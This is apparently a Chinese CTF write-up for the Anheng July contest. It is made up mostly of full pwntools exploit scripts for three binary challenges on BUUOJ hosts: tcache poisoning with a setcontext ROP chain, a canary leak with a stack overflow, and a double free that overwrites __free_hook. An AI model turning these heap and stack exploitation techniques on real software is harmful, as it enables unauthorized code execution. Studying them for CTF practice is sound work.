# 安恒七月赛

比赛题目都很常规，所以直接放exp，写写思路

<!--more-->

# Easyheap

size不正确导致的堆溢出，tcache poison打tcache struct，配合setcontext+53的gadget实现orw。

## exp

```python
from pwn import *

context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
# ,env={'LD_PRELOAD':'./libc-2.27.so'}
# p = process('./Easyheap')
p = remote('node4.buuoj.cn',25578)
libc =ELF('./libc-2.27.so')

def Cmd(idx):
    p.sendlineafter('>> :', str(idx))
    
def add(size, data):
    Cmd(1)
    p.sendlineafter('Size: ', str(size))
    p.sendafter('Content: ', data)
    
def dele(idx):
    Cmd(2)
    p.sendlineafter('Index:', str(idx))
    
def show(idx):
    Cmd(3)
    p.sendlineafter('Index:', str(idx))
    
def edit(idx, data):
    Cmd(4)
    p.sendlineafter('Index:', str(idx))
    p.sendafter('Content:', data)
    
payload = 'A'*0x47
add(0x100,payload)  # 0
add(0x100,payload)  # 1
add(0x100,payload)  # 2
add(0x100,payload)  # 3

dele(3)
dele(2)

edit(0, '1'*0x48+p64(0x51)+'2'*0x48+'a'*8)

# gdb.attach(p)
show(1)
heapbase = u64(p.recvuntil('\x55')[-6:].ljust(8,'\x00')) - 0x350
leak('heapbase',heapbase)
edit(0, '1'*0x48+p64(0x51)+'2'*0x48+p64(0x51))

edit(1,0x48*'a'+p64(0x51)+p64(heapbase+0x10))
add(0x100,payload)  # 2
add(0x100,payload)  # 4 tcache
edit(0,'a'*0x48+p64(0xa1))
dele(1)

edit(0,'a'*0x50)

show(0)
malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) -96 -0x10
libcbase = malloc_hook - libc.sym['__malloc_hook']
free_hook = libcbase + libc.sym['__free_hook']
leak('libc base',libcbase)
setcontex = libcbase + libc.sym['setcontext'] + 53
pop_rdi = libcbase + 0x00000000000215bf
pop_rsi = libcbase + 0x0000000000023eea 
pop_rdx = libcbase + 0x0000000000001b96 
pop_rax = libcbase + 0x0000000000043ae8
syscall_ret = libcbase + 0x00000000000d2745
open_addr = libcbase + libc.sym['open']
read_addr = libcbase + libc.sym['read']
write_addr = libcbase + libc.sym['write']

edit(0,'a'*0x48+p64(0xa1))


orw = ''
orw+= p64(pop_rdi) + p64(heapbase+0x458) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall_ret)
orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(malloc_hook) + p64(pop_rdx) + p64(0x50) + p64(pop_rax) + p64(0) + p64(syscall_ret)
orw+= p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(malloc_hook) + p64(pop_rax) + p64(1) + p64(syscall_ret)
orw+= './flag\x00'

chunk_set = p64(0)*3 + p64(heapbase+0x3a0) + p64(80) + p64(88) + p64(0)+p64(0)+p64(heapbase+0x3a0+0x8) + p64(pop_rdi)

add(0x100,'a'*(0xa1-10))
edit(3,'\x00'*0x100)

add(0x100,'N'*(0x100-8)) # 4
edit(4,orw)

payload = p64(0) + p64(heapbase+0x10) +p64(0)*2+ p64(setcontex)
edit(3,p64(free_hook)*15)
add(0x100,p64(setcontex)) # 5
edit(3,payload.ljust(0x60,'\x00')+chunk_set)
# gdb.attach(p)
dele(3)


p.interactive()
```

## old_things

通过爆破开头为0的md5，导致截断，从而登录成功，之后就是随便打了。

## exp

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')
# p = process('./canary3')
p = remote('node4.buuoj.cn',25807)
elf = ELF('./canary3')
payload = b'\x3d\xfd\xff\xff'

p.sendlineafter('please input username: ', 'admin\x00')
p.sendafter('please input password: ', payload.ljust(0x20, b'\x00'))

p.sendlineafter('.exit', '2')
# gdb.attach(p)
p.sendlineafter('your input:', '1'*8)
p.sendlineafter('.exit', '1')
text_base = u64(p.recvuntil(b'\x55')[-6:].ljust(8,b'\x00')) - 0xa - elf.plt['__isoc99_scanf']
print(hex(text_base))

# overflow
p.sendlineafter('.exit', '2')
p.sendlineafter('your input:', 'a'*24)

# leak
p.sendlineafter('.exit', '1')
buf = p.recvuntil('a'*24+'\n')
canary = u64(p.recv(7).rjust(0x8, b'\x00'))
print(hex(canary))

payload = b'a'*24+p64(canary)+p64(0xdeadbeef) + p64(text_base + 0x239F)
p.sendlineafter('.exit', '2')
p.sendlineafter('your input:', payload)

p.sendlineafter('.exit', '3')

p.interactive()

```

# realNoOutput

数组重合导致跳过check检查。在栈上残留了前一个操作堆块的指针，导致double free。

```python
from pwn import *
context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
# p = process('./realNoOutput')
p = remote('node4.buuoj.cn',28565)
libc = ELF('./libc.so.6')

def add(idx, size, payload):
    p.sendline("1")
    sleep(0.5)
    p.sendline( str(idx))
    sleep(0.5)
    p.sendline(str(size))
     sleep(0.5)
    p.send(payload)

    sleep(0.1)

def delete(idx):
    p.sendline("2")
    sleep(0.5)
    p.sendline(str(idx))

def edit(idx, payload):
    p.sendline("3")
    sleep(0.5)
    p.sendline(str(idx))
    p.sendline(payload)

def show(idx):
    p.sendline("4")
    sleep(0.5)
    p.sendline( str(idx))


if __name__ == "__main__":
    for i in range(8, -1, -1):
        success('ADD: [%d]'%(i))
        add(i, 0x100, '/bin/sh')

    for i in range(7):
        success('Delete: [%d]'%(i))
        delete(i)

    delete(7)
    
    for i in range(7):
        success('Add again: [%d]'%(i))
        add(i, 0x100, '/bin/sh')
    
    add(7, 0x90, 'a' * 8)
    show(7)
    libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x1ebce0
    success('LIBC:\t' + str(hex(libc)))

    # double free
    add(8, 0x68, 'n'*8)
    delete(8)
    edit(0, p64(0) * 2)
    delete(0)

    add(8, 0x68, '/bin/sh')
    delete(8)
    edit(0, p64(0) * 2)
    delete(0)

    free_hook = libc + 0x1eeb28
    success('HOOK:\t' + str(hex(free_hook)))

    add(3, 0x68, p64(free_hook))

    system_sym = 0x055410 + libc
    success('OG:\t' + str(hex(system_sym)))

    add(3, 0x68, p64(system_sym))
    add(3, 0x68, p64(system_sym))


    # gdb.attach(p)
    # p.sendline("1")
    
    p.interactive()

```

